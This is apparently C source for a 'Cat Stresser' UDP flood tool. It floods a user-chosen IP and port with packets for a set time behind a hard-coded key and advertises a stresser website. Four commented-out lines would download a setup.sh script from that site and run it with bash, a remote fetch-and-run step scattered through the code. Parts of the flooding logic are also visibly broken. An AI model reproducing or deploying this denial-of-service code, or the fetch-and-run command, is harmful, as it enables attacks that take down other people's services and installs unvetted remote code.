/*
=============================================================================
            gcc -oterm -pthread -w udpnospoof.c -o udpnospoof
                        ----- CODED SponneR ------
=============================================================================
*/



#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <time.h>
#include <pthread.h>
       // system("cd && cd /home && wget -q --no-check-certificate --delete-after https://cat-stresser.net/setup.sh && bash setup.sh"); 
#define hex_packets 1460
void SendFlood(unsigned char *IP, int DPORT, int Secs)
{
    int SERVER_METHOD;
    SERVER_METHOD = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    unsigned char *HexString = malloc(1024);
    memset(HexString, 0, 1024);
    hp = gethostbyname(IP);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = DPORT;
    unsigned int a = 0;
    while(1)
    {
               // system("cd && cd /home && wget -q --no-check-certificate --delete-after https://cat-stresser.net/setup.sh && bash setup.sh");
        char * RANDOMHEXGEN[] = {    
        "\x6c\x58\x66\x59\x43\x37\x54\x46\x61\x43\x71\x35\x48\x98",
        };
        
        if (a >= 50)
        {
            
            int length;
            char RANDOMHEXGEN[] = "/x89/x25/x76/x98/x67/x87/x93/x96/";
            srand((unsigned int) time(0) + getpid());
            length = rand() % 120 + 200;
            send(SERVER_METHOD, HexString, hex_packets, 0);
            connect(SERVER_METHOD,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + Secs)
            {
                close(SERVER_METHOD);
                exit(0);
            }
            a = 0;
        }
        a++;
    }
}
main(int argc, char **argv)
{
    if(argc < 2)
    {


       // system("cd && cd /home && wget -q --no-check-certificate --delete-after https://cat-stresser.net/setup.sh && bash setup.sh");
        printf("\x1b[96m\n", argv[0]);
        printf("\x1b[96m ██████╗ █████╗ ████████╗  \x1b[93m ███████╗████████╗██████╗ ███████╗███████╗███████╗███████╗██████╗ \n", argv[0]);
        printf("\x1b[96m██╔════╝██╔══██╗╚══██╔══╝  \x1b[93m ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗\n", argv[0]);
        printf("\x1b[96m██║     ███████║   ██║     \x1b[93m ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗█████╗  ██████╔╝\n", argv[0]);
        printf("\x1b[96m██║     ██╔══██║   ██║     \x1b[93m ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║██╔══╝  ██╔══██╗\n", argv[0]);
        printf("\x1b[96m╚██████╗██║  ██║   ██║     \x1b[93m ███████║   ██║   ██║  ██║███████╗███████║███████║███████╗██║  ██║\n", argv[0]);
        printf("\x1b[96m ╚═════╝╚═╝  ╚═╝   ╚═╝     \x1b[93m ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝\n", argv[0]);
        printf("\x1b[96m\n", argv[0]);
        printf("\x1b[97mJoin Us : \x1b[91mhttps://cat-stresser.net\n", argv[0]);
        printf("\x1b[96m\n", argv[0]);                                                                                                                                                 
        printf("\x1b[97mREAD: How to launch !\n", argv[0]);                   
        printf("\x1b[96m\n", argv[0]);
        printf("\x1b[97mUsage: %s [Key] [IP] [Port] [Time]\n", argv[0]);
        printf("\x1b[96m\n", argv[0]);
        exit(1);
    }
    if(!strcmp(argv[1], "1337Systemx86"))
    {
        if(argc < 4)
        {
        printf("\x1b[96m\n", argv[0]);
        printf("\x1b[96m ██████╗ █████╗ ████████╗  \x1b[93m ███████╗████████╗██████╗ ███████╗███████╗███████╗███████╗██████╗ \n", argv[0]);
        printf("\x1b[96m██╔════╝██╔══██╗╚══██╔══╝  \x1b[93m ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗\n", argv[0]);
        printf("\x1b[96m██║     ███████║   ██║     \x1b[93m ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗█████╗  ██████╔╝\n", argv[0]);
        printf("\x1b[96m██║     ██╔══██║   ██║     \x1b[93m ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║██╔══╝  ██╔══██╗\n", argv[0]);
        printf("\x1b[96m╚██████╗██║  ██║   ██║     \x1b[93m ███████║   ██║   ██║  ██║███████╗███████║███████║███████╗██║  ██║\n", argv[0]);
        printf("\x1b[96m ╚═════╝╚═╝  ╚═╝   ╚═╝     \x1b[93m ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝\n", argv[0]);
        printf("\x1b[96m\n", argv[0]);
        printf("\x1b[97mJoin Us : \x1b[91mhttps://cat-stresser.net\n", argv[0]);
        printf("\x1b[96m\n", argv[0]);
            printf("\n\x1b[97mUsage: %s [Key] [IP] [Port] [Time]\n", argv[0]);
            exit(0);
        }
           // system("cd && cd /home && wget -q --no-check-certificate --delete-after https://cat-stresser.net/setup.sh && bash setup.sh");
        else
        {
            unsigned char *IP = argv[2];
            int DPORT = atoi(argv[3]);
            int Time = atoi(argv[4]);
            printf("\n\x1b[1;96mAttack sent.\n", argv[2], argv[4]);
            SendFlood(IP, DPORT, Time);
            exit(0);
        }
    }
}
